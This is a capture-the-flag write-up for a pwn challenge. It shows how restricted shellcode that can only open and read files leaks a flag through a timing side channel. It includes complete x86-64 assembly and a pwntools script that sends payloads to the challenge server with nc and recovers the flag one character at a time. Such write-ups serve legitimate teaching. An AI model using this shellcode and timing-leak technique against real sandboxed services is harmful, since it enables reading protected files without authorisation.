# Exfil Me
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/points-400-orange)

## Description
Even though you have your flag, there's no way to communicate with the outside world!

[exfilme.zip](https://ctf.mcpt.ca/media/problem/M29R_POPO43-CAVo-wid1MkgcIvYBDPlxVGvWaj_CTk/exfilme.zip)

## Solution
We get to run our own shellcode at `0x13371337000`. Sweet! Unfortunately, we can only use the `read`, `open`, and `exit` syscalls, so there appears to be no way to get us the flag. However, we can rely on a timing attack - in which we can guess the flag character by character, and pause for a long time if our guess is correct. Then, if our script runs for a long time, we know that our guess is correct. For example, if I guess that character 0 of the flag is 'F' (which is wrong), the program exits immediately. If instead, I guess 'C' (correct), the program should hang.

To do this, I tried to hang the program using an infinite loop, but that crashed the instance and the only way to fix it was to restart it. Instead, I settled for a for loop with 1 billion iterations - which takes well over 2 seconds to complete.

However, a typical for loop uses labels to determine where to jump to, something unavailable in shellcode.

*Edit: labels and jumping are possible in shellcode. I just didn't realize this while writing the exploit.*

```
label:
 cmp i, n                    ; compare i and n
 jge end_of_loop             ; jump if i >= n
 do stuff
 jmp label                   ; jump to start of loop
end_of_loop:
 do stuff
```
 
To overcome this absolute catastrophe, I had to use `cmov` (similar to `int a = condition ? 0 : 10000`) and store the starting address of the loop in a register, because our code is always loaded at `0x13371337000`.

The code would then look something like this:
```
mov rdx, 0
mov rcx, 1000000000     ; loop iterations
cmp byte[rax], bl       ; compare our guess against the flag
cmovne rcx, rdx         ; set 0 loop iterations if our guess != the right char
mov r12, 0x13371337067  ; the starting address of the loop
dec rcx                 ; i-- (aka the start of the loop)
cmp rcx, 0              ; compare rcx against 0
cmovle r12, rdx         ; if rcx <= 0 then set r12 to 0 (out of bounds memory, will crash when we jump)
jmp r12                 ; jump to r12 (start of loop) or 0 (if i <= 0), crashing the program
```

The rest of the code before this is to read the flag and set rax = address of character we're comparing, and bl = character we're guessing.


```as
main:
 mov eax, 2;                        syscall = open
 xor ebx, ebx;                      push("flag.txt\x00")
 push rbx;
 mov rbx, 0x7478742e67616c66;
 push rbx;
 mov rdi, rsp;                      param1 = "flag.txt"
 xor esi, esi;                      param2 = 0 ("r")
 xor edx, edx;                      param3 = 0 ("r")
 syscall                            int fd = open("flag.txt", "r", "r");
 mov rdi, rax;                      param1 = fd
 xor eax, eax;                      syscall = read
 mov rsi, 0x1337133a000;            param2 = &buf (0x1337133a000, known safe location)
 mov edx, 32;                       param3 = 32
 syscall;                           read(fd, &buf, 32)
 mov r12d, 0;                       $r12 = loop iterations if wrong character (0)
 mov r13d, 1;                       idk this was useless
 mov r14d, 0;                       $r14 = 0
 mov r15d, 1000000000               $r15 = loop iterations if correct character
 mov rax, 0x13371337070;            points to start of for loop
 mov rcx, rax;                      $rcx = start of for loop
 mov rax, 0x1337133a000;            $rax = &buf (from earlier)
*add rax, $index                    $rax = &buf[index]
*mov ebx, $char                     $rbx = char we're testing for
 cmp byte[rax], bl                  if (buf[index] == char we're testing for)
 cmovne r15, r12                        $r15 = 0 (loop zero times)
 dec r15                            for (int i = $r15;; i--) {
 cmp r15, 0                             if (i <= 0)
 cmovle rcx, r14                            $r14 = 0 (crash once we jump)
 jmp rcx                            }
```

The two lines marked with a star need to change between guesses, but all the other lines are identical.

```py
from pwn import *

context.arch = 'amd64'

shellcode = """
 mov eax, 2;
 xor ebx, ebx;
 push rbx;
 mov rbx, 0x7478742e67616c66;
 push rbx;
 mov rdi, rsp;
 xor esi, esi;
 xor edx, edx;
 syscall
 mov rdi, rax;
 xor eax, eax;
 mov rsi, 0x1337133a000;
 mov edx, 32;
 syscall;
 mov r12d, 0;
 mov r13d, 1;
 mov r14d, 0;
 mov r15d, 1000000000;
 mov rax, 0x13371337070;
 mov rcx, rax;
 mov rax, 0x1337133a000;"""

template = asm(shellcode)

"""
 cmp byte[rax], bl
 cmovne r15, r12
 dec r15
 cmp r15, 0
 cmovle rcx, r14
 jmp rcx
"""
template2 = b'\x38\x18\x4d\x0f\x45\xfc\x49\xff\xcf\x49\x83\xff\x00\x49\x0f\x4e\xce\xff\xe1'

flag = ""
import subprocess
import time
import sys
for index in range(len(flag), 32):
    for char in range(33, 126):
        print(flag + chr(char))
        pay = template + asm(f"add rax, {index}; mov ebx, {char}") + template2
        with open('in', 'wb') as f:
            f.write(pay + b'\n')
        try:
            subprocess.run("cat in | nc 15f728c.0x16.ink 30486", shell=True, timeout=2)
        except subprocess.TimeoutExpired:
            flag += chr(char)
            print("New char: " + flag)
            if chr(char) == '}':
                print("We found the flag!")
                sys.exit(0)
            time.sleep(6)
            break
        if char == 125:
            print("Uh oh, error")
            sys.exit(1)
```

This builds the shellcode and sends it to the server, guessing every character in every position. If we guess the right character, the subprocess timeout will kick in, causing a TimeoutExpired exception that we can catch. Then, we append it to the flag and pause for 6 seconds to allow the program to finish looping and crash before we start guessing again.

There is one small problem though - character 10 can't be guessed because `add rax, 10` adds a newline in our input, causing fgets to cut off the rest of our input. So at index 10, I had to stop the program, set the flag variable to the first 9 characters + a placeholder, and then continue running the program. By doing this, I hoped the flag contained some recognizable text that we can use to fill in character 10. If that wasn't possible, the shellcode could be modified without too much hassle for this special case, by doing something like setting rax to `0x13371337071` instead of `0x13371337070` and then only adding 9 instead of 10.

```
CTF{Ever_h_ard_of_BROP?}
We found the flag!
```

At this point, it's pretty obvious that the missing character is `e`.

Flag: `CTF{Ever_heard_of_BROP?}`
